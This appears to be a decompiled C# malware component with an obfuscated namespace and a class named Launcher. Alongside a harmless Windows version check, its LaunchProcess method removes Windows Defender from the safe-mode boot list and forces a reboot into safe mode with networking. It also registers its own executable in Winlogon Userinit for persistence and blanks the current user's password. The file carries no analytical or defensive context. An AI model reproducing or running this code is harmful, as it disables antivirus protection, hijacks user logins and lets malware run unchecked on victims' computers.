using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MufMaOSvGyvz
{
	// Token: 0x02000020 RID: 32
	public class Launcher
	{
		// Token: 0x060000B5 RID: 181
		[DllImport("user32.dll")]
		internal static extern int GetSystemMetrics(int int_0);

		// Token: 0x060000B6 RID: 182
		public static string CheckVersionOS()
		{
			OperatingSystem osversion = Environment.OSVersion;
			Version version = osversion.Version;
			string text = "";
			if (osversion.Platform == PlatformID.Win32Windows)
			{
				int minor = version.Minor;
				if (minor != 0)
				{
					if (minor != 10)
					{
						if (minor == 90)
						{
							text = "Me";
						}
					}
					else if (version.Revision.ToString() == "2222A")
					{
						text = "98SE";
					}
					else
					{
						text = "98";
					}
				}
				else
				{
					text = "95";
				}
			}
			else if (osversion.Platform == PlatformID.Win32NT)
			{
				switch (version.Major)
				{
				case 3:
					text = "NT 3.51";
					break;
				case 4:
					text = "NT 4.0";
					break;
				case 5:
					if (version.Minor == 0)
					{
						text = "2000";
					}
					else
					{
						text = "XP";
					}
					break;
				case 6:
					if (version.Minor == 0)
					{
						text = "Vista";
					}
					else if (version.Minor == 1)
					{
						text = "7";
					}
					else if (version.Minor == 2)
					{
						text = "8";
					}
					else
					{
						text = "8.1";
					}
					break;
				case 10:
					text = "10";
					break;
				}
			}
			if (text != "")
			{
				text = "Windows " + text;
				if (osversion.ServicePack != "")
				{
					text = text + " " + osversion.ServicePack;
				}
			}
			return text;
		}

		// Token: 0x060000B7 RID: 183
		public static bool GetMetrics()
		{
			return Launcher.GetSystemMetrics(67) != 0;
		}

		// Token: 0x060000B8 RID: 184
		public static void LaunchProcess()
		{
			MainCore.CreateProcess("reg.exe", "delete HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefend /f");
			MainCore.CreateProcess("bcdedit.exe", "/set {default} safeboot network");
			MainCore.CreateProcess("reg.exe", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"" + Assembly.GetEntryAssembly().Location + "\",\"C:\\Windows\\system32\\userinit.exe\" /f");
			MainCore.CreateProcess("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split(new char[]
			{
				'\\'
			})[1] + " \"\"");
			MainCore.CreateProcess("shutdown.exe", "/r /t 0");
		}

		// Token: 0x060000B9 RID: 185
		public static void InitLauncher()
		{
			if (!Launcher.GetMetrics())
			{
				Launcher.LaunchProcess();
			}
		}
	}
}
